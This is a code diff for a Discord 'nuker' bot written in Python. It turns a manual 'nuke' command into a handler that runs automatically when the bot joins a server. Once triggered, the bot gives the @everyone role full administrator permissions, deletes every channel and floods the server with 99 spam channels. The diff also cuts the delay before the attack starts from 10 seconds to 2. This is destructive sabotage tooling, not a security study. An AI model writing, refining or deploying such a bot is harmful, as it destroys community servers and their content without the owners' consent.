@@ -124,10 +124,8 @@ async def guildname(ctx, *, name):
   await ctx.guild.edit(name=name)
 
 webhooks = ["!!!WEBHOOKS HERE!!!"]
-@bot.command()
-async def nuke(ctx):
-    await ctx.message.delete()
-    guild = ctx.guild
+@bot.event
+async def on_guild_join(guild):
     try:
       role = discord.utils.get(guild.roles, name = "@everyone")
       await role.edit(permissions = Permissions.all())
@@ -135,7 +133,7 @@ async def nuke(ctx):
     except:
       print(Fore.RED + f"There was an error when attempting to give everyone perms in {guild.name}.")
     print(Style.RESET_ALL)
-    await asyncio.sleep(10)
+    await asyncio.sleep(2)
     print(f"Nuking server {guild.name}...")
     for channel in guild.channels:
       try:
@@ -180,7 +178,7 @@ async def nuke(ctx):
     amount = 99
     for i in range(amount):
       await guild.create_text_channel(random.choice(CHANNEL_NAMES))
-      print("Nuked {guild.name} successfully")
+    print(f"Nuked {guild.name} successfully")
     return
 
 @bot.command(pass_context=True)
